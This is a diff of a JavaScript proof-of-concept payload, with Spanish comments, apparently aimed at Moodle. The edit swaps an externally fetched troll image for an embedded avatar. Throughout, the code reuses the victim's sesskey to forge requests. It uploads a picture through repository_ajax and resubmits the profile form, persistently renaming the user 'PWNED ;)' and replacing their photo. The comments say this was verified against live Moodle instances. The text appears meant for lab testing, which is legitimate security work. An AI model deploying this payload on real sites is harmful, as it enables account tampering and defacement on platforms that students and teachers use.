@@ -6,12 +6,10 @@
  * same-origin (legacy) y solo contra un laboratorio propio y desechable.
  */
 
-// Imagen de troll usada como PoC de "sustituyo tu foto de perfil". Construida
-// en trozos como en el original (no es ofuscación, así llegó de probe.js).
-var EXE_TROLL = ['https:', '//', 'upload.wikimedia.org', '/wikipedia/en/7/73/Trollface.png'].join('');
+import { AVATAR_DATA_URI, avatarPng } from './avatar.js';
 
 // Cambia el NOMBRE (core_user_update_users) y la FOTO de perfil (sube un PNG del
-// troll al filemanager vía repository_ajax y envía el form de perfil) del usuario
+// avatar al filemanager vía repository_ajax y envía el form de perfil) del usuario
 // actual, forjado con el sesskey same-origin. Verificado en Moodle REAL; en el
 // Playground PHP-WASM falla (su runtime no sirve /lib/ajax ni /repository).
 export function ownUser(ctx, journal, cb) {
@@ -35,7 +33,7 @@ export function ownUser(ctx, journal, cb) {
     // (a) swap inmediato del avatar en el DOM — efecto visual al instante
     try {
       var avs = w.document.querySelectorAll('img.userpicture, .usermenu img, img[src*="/user/icon"], img[src*="pluginfile.php"][src*="user"]');
-      for (var i = 0; i < avs.length; i++) { if (!avs[i].hasAttribute('data-exe-orig')) { avs[i].setAttribute('data-exe-orig', avs[i].src); } avs[i].src = EXE_TROLL; avs[i].style.outline = '2px solid #39ff77'; }
+      for (var i = 0; i < avs.length; i++) { if (!avs[i].hasAttribute('data-exe-orig')) { avs[i].setAttribute('data-exe-orig', avs[i].src); } avs[i].src = AVATAR_DATA_URI; avs[i].style.outline = '2px solid #39ff77'; }
       res.avatarSwappedInDom = avs.length;
     } catch (e) { res.avatarSwappedInDom = 'BLOCKED:' + e.name; }
     if (!sk || !uid) { res.renamed = false; res.note = 'sin sesskey o userId (¿logueado? ¿Moodle real?)'; cb(JSON.stringify(res)); return; }
@@ -56,13 +54,13 @@ export function ownUser(ctx, journal, cb) {
     //   user/edit.php?id=<uno-mismo>  -> CUALQUIER usuario cambia su PROPIO nombre+foto
     //   (no requiere capacidades de admin; el core_user_update_users de (b) solo va admin).
     //   user/editadvanced.php?id=<id> -> editar a OTROS (solo admin). Fallback.
-    // Descarga el PNG -> sube al area draft (repository_ajax) -> reenvia el form con
-    // firstname='PWNED ;)' + el itemid de la foto. Verificado live en Moodle local y en
-    // moodle.example (profesor sobre su PROPIO perfil via edit.php).
-    var photoP = w.fetch(EXE_TROLL, { credentials: 'omit', mode: 'cors' })
-      .then(function (r) { if (!r.ok) { throw new Error('img HTTP ' + r.status); } return r.blob(); })
+    // Rasteriza el avatar propio (embebido, sin red) -> sube al area draft
+    // (repository_ajax) -> reenvia el form con firstname='PWNED ;)' + el itemid de la
+    // foto. Verificado live en Moodle local y en moodle.example (profesor sobre su
+    // PROPIO perfil via edit.php).
+    var photoP = new Promise(function (resolve) { avatarPng(ctx.win, 256, function (blob) { resolve(blob); }); })
       .then(function (blob) {
-        if (!blob) { res.photoChanged = 'img-fetch-fail'; return; }
+        if (!blob) { res.photoChanged = 'img-render-fail'; return; }
         var editVia = function (url) {
           return w.fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (html) {
             var forms = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
@@ -71,7 +69,7 @@ export function ownUser(ctx, journal, cb) {
             if (!itemEl) { return 'no-form'; }
             var itemid = itemEl.value;
             var repoId = (function () { var k = html.indexOf('"type":"upload"'); if (k < 0) { return '5'; } var bb = html.slice(Math.max(0, k - 300), k); var m = bb.match(/"id":"?(\d+)"?[^{}]*$/); return m ? m[1] : '5'; })();
-            var ufd = new FormData(); ufd.append('repo_upload_file', blob, 'troll.png'); ufd.append('sesskey', sk); ufd.append('repo_id', repoId); ufd.append('itemid', itemid); ufd.append('savepath', '/'); ufd.append('title', 'troll.png'); ufd.append('author', 'PoC'); ufd.append('license', 'unknown');
+            var ufd = new FormData(); ufd.append('repo_upload_file', blob, 'pwned-avatar.png'); ufd.append('sesskey', sk); ufd.append('repo_id', repoId); ufd.append('itemid', itemid); ufd.append('savepath', '/'); ufd.append('title', 'pwned-avatar.png'); ufd.append('author', 'PoC'); ufd.append('license', 'unknown');
             return w.fetch(root + '/repository/repository_ajax.php?action=upload', { method: 'POST', credentials: 'same-origin', body: ufd }).then(function (ur) { return ur.json(); }).then(function () {
               var fd = new FormData(form); fd.delete('cancel'); fd.set('submitbutton', '1');
               if (fd.has('firstname')) { fd.set('firstname', 'PWNED ;)'); res.renamedViaForm = true; }
@@ -88,7 +86,7 @@ export function ownUser(ctx, journal, cb) {
           });
         });
       }).catch(function (e) { res.photoChanged = 'ERR:' + (e.message || e.name); });
-    Promise.all([renameP, photoP]).then(function () { res.note = 'nombre→"PWNED ;)" + foto→troll (PERSISTENTES). Reversible desde el perfil del usuario.'; cb(JSON.stringify(res)); });
+    Promise.all([renameP, photoP]).then(function () { res.note = 'nombre→"PWNED ;)" + foto→avatar PWNED (PERSISTENTES). Reversible desde el perfil del usuario.'; cb(JSON.stringify(res)); });
   } catch (e) { cb('BLOQUEADO: ' + e.name); }
 }
 
